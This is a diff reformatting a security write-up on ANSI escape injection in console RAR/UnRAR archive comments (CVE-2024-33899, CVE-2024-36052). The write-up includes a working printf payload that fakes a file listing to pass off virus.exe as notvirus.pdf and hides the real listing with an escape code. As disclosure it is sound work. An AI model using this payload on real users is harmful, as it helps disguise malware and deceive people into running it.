@@ -20,6 +20,7 @@ To check if ANSI escape sequences are filtered out in the comment section, we ca
 
 ```bash
 printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | rar c demo.rar
+```
 Upon executing rar l demo.rar, the output shows "THIS IS GREEN" in green, indicating that the comment field does not filter ANSI escape sequences.
 
 Exploitation
@@ -28,21 +29,22 @@ This vulnerability can be exploited in various ways. Here, we will demonstrate a
 Creating the Exploit
 First, we will place our virus.exe file inside a RAR archive:
 
-bash
-Copy code
+```bash
 $ ls 
 virus.exe
 $ rar a demo.rar virus.exe
-Next, we will add the following payload to the comment section:
+```
 
-bash
-Copy code
+Next, we will add the following payload to the comment section:
+```bash
 printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar
+```
+
 This payload includes a fake listing where virus.exe is replaced with notvirus.pdf. The ANSI escape sequence \e[8m is used to hide all content after the comment section in the output. Consequently, the actual file listing is hidden, and our fake file listing is displayed.
 
-Result
+## Result
 In the screenshot below, you can see a large gap between the output and the shell prompt. This gap is due to the original file listing being outputted but rendered invisible using \e[8m. While experienced command line users may find this suspicious, less experienced users could easily be tricked.
 
 
-Conclusion
+## Conclusion
 The ANSI escape sequence injection vulnerability in the console versions of RAR and UnRAR posed a significant risk, allowing attackers to spoof output and potentially cause denial of service. This issue, identified as CVE-2024-33899 for Linux and Unix systems and CVE-2024-36052 for Windows, was addressed in WinRAR version 7.00. Users are strongly encouraged to update to the latest version to protect against this vulnerability. The GUI version of WinRAR and the UnRAR library remain unaffected by this issue.
